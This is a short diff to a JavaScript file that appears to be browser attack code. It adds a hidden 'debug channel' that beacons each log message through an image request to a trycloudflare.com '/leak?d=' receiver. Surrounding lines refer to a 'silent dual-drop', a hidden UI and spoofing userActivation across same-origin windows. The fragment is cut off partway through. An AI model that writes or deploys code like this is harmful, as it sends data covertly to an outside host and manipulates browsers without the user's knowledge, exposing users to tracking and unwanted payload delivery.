@@ -11,7 +11,17 @@
 (function () {
   var R = "https://consultant-casinos-generation-camel.trycloudflare.com/leak?d=";
   var EPOCH = 1792678200;
-  function log(m) { try { console.log("[T71P2] " + m + " @" + Date.now()); } catch (e) {} }
+  /* invisible debug channel: every log line is also beaconed to the
+     receiver dashboard (the UI is hidden in part 2, so the dashboard
+     is the console) */
+  var RLOG = "https://consultant-casinos-generation-camel.trycloudflare.com/leak?d=";
+  function log(m) {
+    try { console.log("[T71P2] " + m + " @" + Date.now()); } catch (e) {}
+    try {
+      var im = new Image();
+      im.src = RLOG + encodeURIComponent("LOG|T71P2|" + String(m).slice(0, 120)) + "-" + Date.now();
+    } catch (e2) {}
+  }
   log("PART2 silent dual-drop, epoch " + EPOCH);
 
   /* spoof userActivation on every same-origin window (T11-proven; the
